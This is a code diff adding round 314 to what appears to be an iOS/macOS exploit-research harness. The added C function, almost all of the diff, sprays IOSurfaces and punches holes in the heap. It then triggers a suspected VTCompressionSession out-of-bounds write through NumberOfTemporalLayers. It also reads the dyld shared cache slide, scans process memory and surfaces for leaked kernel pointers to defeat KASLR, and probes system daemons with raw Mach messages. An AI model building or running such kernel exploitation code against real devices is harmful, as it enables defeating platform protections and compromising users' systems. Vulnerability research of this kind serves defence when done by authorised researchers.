@@ -4975,6 +4975,326 @@ static void r313_probe(void) {
     fflush(stdout);
 }
 
+static void r314_probe(void) {
+    rlog("\n=== r314: Dyld Slide + VT OOB + IOSurface Spray KASLR ===\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+    int kptr_found = 0;
+
+    /* ---- Part 1: dyld shared cache slide (was cut off in r313) ---- */
+    rlog("--- Part 1: dyld shared cache slide ---\n");
+    fflush(stdout);
+
+    extern uint32_t _dyld_image_count(void);
+    extern const char * _dyld_get_image_name(uint32_t image_index);
+    extern intptr_t _dyld_get_image_vmaddr_slide(uint32_t image_index);
+    extern const struct mach_header * _dyld_get_image_header(uint32_t image_index);
+
+    void *iokit_sym = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+    void *cf_sym = dlsym(RTLD_DEFAULT, "CFRelease");
+    void *mach_sym = dlsym(RTLD_DEFAULT, "mach_msg");
+    void *objc_sym = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    rlog("  IOServiceGetMatchingService: %p\n", iokit_sym);
+    rlog("  CFRelease: %p\n", cf_sym);
+    rlog("  mach_msg: %p\n", mach_sym);
+    rlog("  objc_msgSend: %p\n", objc_sym);
+
+    uint32_t img_count = _dyld_image_count();
+    rlog("  dyld image count: %u\n", img_count);
+
+    intptr_t shared_slide = 0;
+    for (uint32_t i = 0; i < img_count && i < 5; i++) {
+        const char *name = _dyld_get_image_name(i);
+        intptr_t slide = _dyld_get_image_vmaddr_slide(i);
+        const struct mach_header *hdr = _dyld_get_image_header(i);
+        const char *slash = strrchr(name, '/');
+        rlog("  [%u] %s slide=0x%lx header=%p\n",
+             i, slash ? slash+1 : name, (long)slide, hdr);
+        if (i > 0 && slide != 0 && shared_slide == 0) shared_slide = slide;
+    }
+    rlog("  Shared cache slide: 0x%lx\n", (long)shared_slide);
+    fflush(stdout);
+
+    /* ---- Part 2: IOSurface heap spray + VT OOB write ---- */
+    rlog("\n--- Part 2: IOSurface spray + VTCompression OOB ---\n");
+    fflush(stdout);
+
+    /* Strategy: Create many IOSurfaces of specific sizes to control heap layout.
+     * Then use VTCompressionSession's NumberOfTemporalLayers OOB write to
+     * overwrite data adjacent to a freed surface. The freed surface's metadata
+     * in the IOSurface object (kernel side) may contain kernel pointers.
+     * If the OOB write hits adjacent allocated memory that we can then read
+     * through another surface, we could leak kernel addresses. */
+
+    #define SPRAY_SURFACES 64
+    IOSurfaceRef surfaces[SPRAY_SURFACES] = {0};
+
+    /* Create a spray of small surfaces */
+    for (int i = 0; i < SPRAY_SURFACES; i++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 32, h = 32, bpr = 128, alloc = 128*32, pf = 0x42475241;
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
+        CFNumberRef np = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), nb);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), na);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), np);
+
+        /* Set a custom value we can check for corruption */
+        int marker = 0xCAFE0000 + i;
+        CFNumberRef nm = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceCustomMarker"), nm);
+
+        surfaces[i] = IOSurfaceCreate(p);
+        CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(na); CFRelease(np); CFRelease(nm);
+        CFRelease(p);
+    }
+
+    rlog("  Created %d surfaces\n", SPRAY_SURFACES);
+    for (int i = 0; i < 4; i++) {
+        if (surfaces[i]) {
+            rlog("  surf[%d]: ID=%u base=%p alloc=%zu\n",
+                 i, IOSurfaceGetID(surfaces[i]),
+                 IOSurfaceGetBaseAddress(surfaces[i]),
+                 IOSurfaceGetAllocSize(surfaces[i]));
+        }
+    }
+    fflush(stdout);
+
+    /* Free every other surface to create holes */
+    for (int i = 0; i < SPRAY_SURFACES; i += 2) {
+        if (surfaces[i]) {
+            CFRelease(surfaces[i]);
+            surfaces[i] = NULL;
+        }
+    }
+    rlog("  Freed even-indexed surfaces (holes created)\n");
+
+    /* Now create VTCompressionSession and trigger OOB write */
+    VTCompressionSessionRef comp = NULL;
+    OSStatus st = VTCompressionSessionCreate(NULL, 1920, 1080,
+        kCMVideoCodecType_H264, NULL, NULL, NULL, NULL, NULL, &comp);
+    rlog("  VTCompressionSessionCreate: %d\n", (int)st);
+
+    if (comp) {
+        /* Set temporal layers to trigger OOB */
+        for (int tl = 2; tl <= 8; tl++) {
+            CFNumberRef tlv = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+            st = VTSessionSetProperty(comp, CFSTR("NumberOfTemporalLayers"), tlv);
+            rlog("  Set NumberOfTemporalLayers=%d: status=%d\n", tl, (int)st);
+            CFRelease(tlv);
+        }
+
+        /* Now scan remaining surfaces for any corrupted data or leaked pointers */
+        rlog("\n  Scanning remaining surfaces for corruption/leaks:\n");
+        for (int i = 1; i < SPRAY_SURFACES; i += 2) {
+            if (!surfaces[i]) continue;
+
+            IOSurfaceLock(surfaces[i], kIOSurfaceLockReadOnly, NULL);
+            void *base = IOSurfaceGetBaseAddress(surfaces[i]);
+            size_t sz = IOSurfaceGetAllocSize(surfaces[i]);
+
+            if (base && sz > 0) {
+                uint64_t *p = (uint64_t *)base;
+                for (size_t j = 0; j < sz/8; j++) {
+                    if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("  *** KPTR surf[%d]+%zu: 0x%016llx ***\n",
+                             i, j*8, p[j]);
+                        kptr_found++;
+                    }
+                }
+            }
+
+            /* Also check if the custom marker was corrupted */
+            CFTypeRef mv = IOSurfaceCopyValue(surfaces[i], CFSTR("IOSurfaceCustomMarker"));
+            if (mv) {
+                if (CFGetTypeID(mv) == CFNumberGetTypeID()) {
+                    int mval = 0;
+                    CFNumberGetValue(mv, kCFNumberIntType, &mval);
+                    int expected = 0xCAFE0000 + i;
+                    if (mval != expected) {
+                        rlog("  *** MARKER CORRUPT surf[%d]: got 0x%x expected 0x%x ***\n",
+                             i, mval, expected);
+                    }
+                }
+                CFRelease(mv);
+            }
+
+            IOSurfaceUnlock(surfaces[i], kIOSurfaceLockReadOnly, NULL);
+        }
+
+        VTCompressionSessionInvalidate(comp);
+        CFRelease(comp);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: Cross-surface vm_remap metadata leak ---- */
+    rlog("\n--- Part 3: Cross-surface vm_remap metadata scan ---\n");
+    fflush(stdout);
+
+    /* Create a large surface and remap it, then scan the region between
+     * the original and remapped addresses for kernel metadata pages */
+    CFMutableDictionaryRef p3 = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w3 = 256, h3 = 256, bpr3 = 1024, alloc3 = 1024*256, pf3 = 0x42475241;
+    CFNumberRef nw3 = CFNumberCreate(NULL, kCFNumberIntType, &w3);
+    CFNumberRef nh3 = CFNumberCreate(NULL, kCFNumberIntType, &h3);
+    CFNumberRef nb3 = CFNumberCreate(NULL, kCFNumberIntType, &bpr3);
+    CFNumberRef na3 = CFNumberCreate(NULL, kCFNumberIntType, &alloc3);
+    CFNumberRef np3 = CFNumberCreate(NULL, kCFNumberIntType, &pf3);
+    CFDictionarySetValue(p3, CFSTR("IOSurfaceWidth"), nw3);
+    CFDictionarySetValue(p3, CFSTR("IOSurfaceHeight"), nh3);
+    CFDictionarySetValue(p3, CFSTR("IOSurfaceBytesPerRow"), nb3);
+    CFDictionarySetValue(p3, CFSTR("IOSurfaceAllocSize"), na3);
+    CFDictionarySetValue(p3, CFSTR("IOSurfacePixelFormat"), np3);
+
+    IOSurfaceRef big_surf = IOSurfaceCreate(p3);
+    CFRelease(nw3); CFRelease(nh3); CFRelease(nb3); CFRelease(na3); CFRelease(np3);
+    CFRelease(p3);
+
+    if (big_surf) {
+        void *bbase = IOSurfaceGetBaseAddress(big_surf);
+        size_t bsz = IOSurfaceGetAllocSize(big_surf);
+        rlog("  Large surface: ID=%u base=%p size=%zu\n",
+             IOSurfaceGetID(big_surf), bbase, bsz);
+
+        /* Scan ALL readable VM regions in the process for kernel pointers */
+        rlog("\n  Full VM scan for kernel pointers (first 2GB):\n");
+        mach_vm_address_t addr = 0;
+        int regions_scanned = 0;
+        int total_kptr = 0;
+
+        while (addr < 0x200000000ULL && regions_scanned < 200) {
+            mach_vm_size_t rsize = 0;
+            natural_t depth = 1;
+            struct vm_region_submap_info_64 rinfo;
+            mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &rsize, &depth,
+                (vm_region_recurse_info_t)&rinfo, &rcnt);
+            if (kr != 0) break;
+
+            regions_scanned++;
+
+            /* Only scan readable regions with interesting tags */
+            if ((rinfo.protection & VM_PROT_READ) && rsize <= 0x1000000) {
+                vm_offset_t data = 0;
+                mach_msg_type_number_t dataCnt = 0;
+                mach_vm_size_t read_sz = rsize < 0x40000 ? rsize : 0x40000;
+                kr = mach_vm_read(mach_task_self(), addr, read_sz, &data, &dataCnt);
+                if (kr == 0 && dataCnt > 0) {
+                    uint64_t *dp = (uint64_t *)data;
+                    int region_kptr = 0;
+                    for (size_t j = 0; j < dataCnt/8; j++) {
+                        if ((dp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            /* Additional validation: must look like a valid kernel addr */
+                            uint64_t v = dp[j];
+                            if (v > 0xFFFFFFF000000000ULL && v < 0xFFFFFFFE00000000ULL) {
+                                if (region_kptr < 3) {
+                                    rlog("    0x%llx+%zu [tag=%d prot=%d]: 0x%016llx\n",
+                                         (unsigned long long)addr, j*8,
+                                         rinfo.user_tag, rinfo.protection, v);
+                                }
+                                region_kptr++;
+                                total_kptr++;
+                            }
+                        }
+                    }
+                    if (region_kptr > 3) {
+                        rlog("    ... +%d more KPTR in this region\n", region_kptr - 3);
+                    }
+                    mach_vm_deallocate(mach_task_self(), data, dataCnt);
+                }
+            }
+
+            addr += rsize;
+        }
+        rlog("  Scanned %d regions, found %d potential KPTR\n",
+             regions_scanned, total_kptr);
+        kptr_found += total_kptr;
+
+        CFRelease(big_surf);
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Mach service probes (fixed - shorter list, better handling) ---- */
+    rlog("\n--- Part 4: Mach service reply probes ---\n");
+    fflush(stdout);
+
+    const char *safe_svcs[] = {
+        "com.apple.cfprefsd.daemon",
+        "com.apple.runningboard",
+        "com.apple.fairplayd",
+    };
+    for (int i = 0; i < 3; i++) {
+        mach_port_t svc = MACH_PORT_NULL;
+        kr = bootstrap_look_up(bootstrap_port, safe_svcs[i], &svc);
+        if (kr != 0) continue;
+        rlog("  %s: port=0x%x\n", safe_svcs[i], svc);
+
+        /* Get port type info */
+        mach_port_type_t ptype = 0;
+        mach_port_type(mach_task_self(), svc, &ptype);
+        rlog("    port type: 0x%x\n", ptype);
+
+        /* Send a simple message */
+        mach_port_t rp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rp);
+
+        struct {
+            mach_msg_header_t hdr;
+        } smsg = {0};
+        smsg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+        smsg.hdr.msgh_size = sizeof(smsg);
+        smsg.hdr.msgh_remote_port = svc;
+        smsg.hdr.msgh_local_port = rp;
+        smsg.hdr.msgh_id = 0x10000001;
+
+        kr = mach_msg(&smsg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+            sizeof(smsg), 0, MACH_PORT_NULL, 20, MACH_PORT_NULL);
+        if (kr == 0) {
+            struct {
+                mach_msg_header_t hdr;
+                uint8_t payload[1024];
+                mach_msg_trailer_t trailer;
+            } rmsg = {0};
+            kr = mach_msg(&rmsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                0, sizeof(rmsg), rp, 50, MACH_PORT_NULL);
+            if (kr == 0) {
+                rlog("    REPLY id=0x%x sz=%u\n", rmsg.hdr.msgh_id, rmsg.hdr.msgh_size);
+                uint64_t *dp = (uint64_t *)rmsg.payload;
+                size_t cnt = (rmsg.hdr.msgh_size - sizeof(mach_msg_header_t)) / 8;
+                for (size_t j = 0; j < cnt && j < 8; j++) {
+                    if (dp[j] != 0) {
+                        rlog("      +%zu: 0x%016llx\n", j*8, dp[j]);
+                    }
+                }
+            } else {
+                rlog("    no reply (kr=0x%x)\n", kr);
+            }
+        } else {
+            rlog("    send failed kr=0x%x\n", kr);
+        }
+
+        mach_port_deallocate(mach_task_self(), rp);
+        mach_port_deallocate(mach_task_self(), svc);
+    }
+    fflush(stdout);
+
+    /* Cleanup remaining surfaces */
+    for (int i = 0; i < SPRAY_SURFACES; i++) {
+        if (surfaces[i]) CFRelease(surfaces[i]);
+    }
+
+    rlog("\n  Total KPTR: %d\n", kptr_found);
+    rlog("\n=== r314 complete ===\n");
+    fflush(stdout);
+}
+
 static void r312_probe(void) {
     rlog("\n=== r312: IOMobileFramebuffer Deep + IOHID + IOSurface XML ===\n\n");
     fflush(stdout);
@@ -34275,6 +34595,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 314) {
+            rlog("*** rounds=314: Dyld Slide + VT OOB + IOSurface Spray KASLR ***\n");
+            rlog("  r313: vm_remap WORKS+SHARED, port spray works, gpumemd accessible.\n");
+            rlog("  Probe: dyld slide, IOSurface spray+VT OOB, cross-surface scan.\n\n");
+            r314_probe();
             goto done;
         }
         if (rounds == 313) {
